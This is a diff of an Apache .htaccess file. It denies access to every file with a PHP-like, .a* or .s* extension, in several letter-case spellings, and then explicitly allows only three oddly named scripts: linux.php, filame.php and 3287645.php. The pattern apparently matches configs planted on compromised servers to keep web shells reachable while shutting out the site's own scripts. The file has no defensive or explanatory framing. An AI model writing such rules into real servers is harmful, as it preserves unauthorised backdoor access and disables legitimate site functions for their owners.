@@ -1,7 +1,36 @@
-<FilesMatch "^(linux\.php|filame\.php|3287645\.php)$">
-    Require all granted
-</FilesMatch>
+<Files *.ph*>
+    Order Deny,Allow 
+    Deny from all
+</Files>
+<Files *.a*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.S*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.s*>
+    Order Deny,Allow
+    Deny from all
+</Files>
 
-<FilesMatch ".*">
-    Require all denied
+<FilesMatch "^(linux.php|filame.php|3287645.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
 </FilesMatch>
